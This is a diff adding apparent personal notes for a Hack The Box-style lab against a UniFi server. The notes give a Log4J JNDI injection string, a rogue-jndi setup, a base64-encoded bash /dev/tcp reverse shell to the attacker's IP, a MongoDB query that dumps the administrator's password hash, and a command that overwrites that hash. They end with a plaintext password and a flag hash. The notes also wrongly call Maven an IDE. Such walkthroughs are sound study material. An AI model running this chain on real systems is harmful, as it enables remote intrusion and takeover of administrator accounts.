@@ -1,0 +1,105 @@
+This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection),
+which is a web security vulnerability that allows an attacker to execute arbitrary operating system
+commands on the server that is running the application and typically fully compromise the application and
+all its data.
+
+
+
+${jndi:ldap://Tun0IP Address/whatever}
+
+
+ JNDI (Java Naming and Directory Interface) is a Java API (Application Programming Interface), not a function or library in the traditional sense. It provides a way for Java applications to interact with naming and directory services, such as LDAP (Lightweight Directory Access Protocol) servers, DNS (Domain Name System) servers, and others.
+    
+ ldap://10.10.14.19/whatever: This part specifies the LDAP (Lightweight Directory Access Protocol) URL to be looked up using JNDI. In this case, it's trying to connect to an LDAP server located at 10.10.14.19 and querying the resource named whatever.
+ The default port that LDAP runs on is port 389 .
+
+
+
+ #sudo tcpdump -i tun0 port 389
+
+
+
+
+We will have to install Open-JDK and Maven on our system in order to build a payload that we can send to
+the server and will give us Remote Code Execution on the vulnerable system.
+Open-JDK is the Java Development kit, which is used to build Java applications. Maven on the other hand is
+an Integrated Development Environment (IDE) that can be used to create a structured project and compile
+our projects into jar files .
+These applications will also help us run the rogue-jndi Java application, which starts a local LDAP server
+and allows us to receive connections back from the vulnerable server and execute malicious code.
+
+#sudo apt install openjdk-11-jdk -y
+#sudo apt install maven
+
+
+After the installation has completed we can check the version of Maven as follows.
+Once we have installed the required packages, we now need to download and build the Rogue-JNDI Java
+application.
+Let's clone the respective repository and build the package using Maven.
+
+
+#git clone https://github.com/veracode-research/rogue-jndi
+#cd rogue-jndi
+#mvn package
+
+
+This will create a .jar file in rogue-jndi/target/ directory called RogueJndi-1.1.jar . Now we can
+construct our payload to pass into the RogueJndi-1-1.jar Java application.
+To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for
+giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding
+issues.
+
+
+Create a reverse shell
+-------------------------
+echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' |
+base64
+
+
+java -jar target/RogueJndi-1.1.jar --command "bash -c
+{echo,base64string from reverse shell}|{base64,-d}|{bash,-i}" --hostname "10.10.14.33"
+
+
+
+6ced1a6a89e666c0620cdb10262ba127
+
+
+
+Privilege Escalation
+---------------------
+
+
+First let's check if MongoDB is running on the target system,
+which might make it possible for us to extract credentials in order to login to the administrative panel.
+
+We can see MongoDB is running on the target system on port 27117 .
+
+Let's interact with the MongoDB service by making use of the mongo command line utility and attempting to
+extract the administrator password. A quick Google search using the keywords UniFi Default Database
+shows that the default database name for the UniFi application is (ace) .
+
+
+#ps aux | grep mongo
+
+
+port - 27117
+
+#mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+
+
+
+"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+	"name" : "administrator",
+	"email" : "administrator@unified.htb",
+	"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+	"time_created" : NumberLong(1640900495),
+
+
+Create a new password , insert that sha512 and update admin password
+--------------------------------------------------------------------
+#mkpasswd -m sha512 password
+
+#mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$PT7RmPy4TVmFw7QR$6S1Yvgmi7JFNYPXAtAyW9..EGsOQBmDwcQ8xtuI9CuapLcap1501hMl7oh0IAdRFzbKWktDh7m/ppenVRrOIL1"}})'
+
+
+NotACrackablePassword4U2022
